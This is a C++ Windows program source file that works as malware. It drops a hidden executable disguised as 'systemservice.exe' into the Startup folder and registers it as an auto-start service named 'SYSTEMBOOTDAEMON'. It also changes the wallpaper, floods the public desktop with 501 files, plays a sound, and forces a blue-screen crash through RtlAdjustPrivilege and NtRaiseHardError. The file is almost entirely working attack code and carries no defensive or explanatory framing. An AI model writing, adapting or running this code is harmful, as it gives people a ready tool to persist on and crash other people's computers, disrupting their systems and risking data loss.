
#include "Header.h"

int APIENTRY wWinMain(HINSTANCE Instance, //no window
    HINSTANCE hPreInstance,
    LPTSTR    lpCmdLine,
    int		  nCmdShow) {

    char* userdatapath = getenv("APPDATA"); //get %appdata% path
    std::string datapath;
    datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
    char filename[MAX_PATH] = "systemservice.exe";
    char newLocation[77];
    strcpy(newLocation, datapath.c_str());

    //STARTUPINFOW si;
       //PROCESS_INFORMATION pi;

       /*ZeroMemory(&si, sizeof(si));
       si.cb = sizeof(si);
       ZeroMemory(&pi, sizeof(pi));

       if (CreateProcessW(L"sc.exe create SYSTEMBOOTDAEMON binPath = \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemservice.exe\" start= auto\"", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
       {
           WaitForSingleObject(pi.hProcess, INFINITE);
           CloseHandle(pi.hProcess);
           CloseHandle(pi.hThread);
       }*/

    if (std::filesystem::exists(datapath + "\\systemservice.exe") != true) { //checks for existing file

        //extracts exe
        HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(102), _T("BINARY"));

        HGLOBAL hResc = LoadResource(NULL, hResInformation);

        unsigned char* Res = (unsigned char*)LockResource(hResc);

        int Ressize = SizeofResource(NULL, hResInformation);

        HANDLE exeFile = CreateFile(L"systemservice.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD wWritten = Ressize;
        WriteFile(exeFile, Res, Ressize, &wWritten, NULL);

        CloseHandle(exeFile);

        //copies itself to starup folder
        std::filesystem::copy(filename, newLocation);
        std::remove(filename);

        HRSRC hResInf = FindResource(NULL, MAKEINTRESOURCE(104), _T("JPG"));

        HGLOBAL hRe = LoadResource(NULL, hResInf);

        unsigned char* mRes = (unsigned char*)LockResource(hRe);

        int size = SizeofResource(NULL, hResInf);

        HANDLE File = CreateFile(L"DFJsjawHfkaHJo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD Written = size;
        WriteFile(File, mRes, size, &Written, NULL);

        CloseHandle(File);

        char imagefile[MAX_PATH] = "DFJsjawHfkaHJo.jpg";
        std::filesystem::copy(imagefile, "C:\\Users\\Public");
        std::remove(imagefile);

        HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(105), _T("WAVE"));

        HGLOBAL hRes = LoadResource(NULL, hResInfo);

        unsigned char* memRes = (unsigned char*)LockResource(hRes);

        int sizeRes = SizeofResource(NULL, hResInfo);

        HANDLE hFile = CreateFile(L"fJFEjeowjHNoT.wav", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD bytesWritten = sizeRes;
        WriteFile(hFile, memRes, sizeRes, &bytesWritten, NULL);

        CloseHandle(hFile);
       
        system("sc.exe create SYSTEMBOOTDAEMON binPath= \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemservice.exe\" start= auto\"");

    }

    //sets jpg as desktop background
    std::string imagepath = "C:\\Users\\Public\\DFJsjawHfkaHJo.jpg";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (char*)imagepath.c_str(), SPIF_UPDATEINIFILE);

    for (int i = 0; i <= 500; i++) {
        int x = i;
        std::string number = std::to_string(x);
        std::string filename = "C:\\Users\\Public\\Desktop\\" + number + ".txt";
        std::ofstream outfile(filename.c_str());
        outfile.close();
    }

    std::filesystem::copy("fJFEjeowjHNoT.wav", "C:\\Users\\Public");
    std::remove("fJFEjeowjHNoT.wav");
    PlaySound(L"c:\\Users\\Public\\fJFEjeowjHNoT.wav", NULL, SND_FILENAME);
    std::remove("c:\\Users\\Public\\fJFEjeowjHNoT.wav");

    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);

    return 0;
}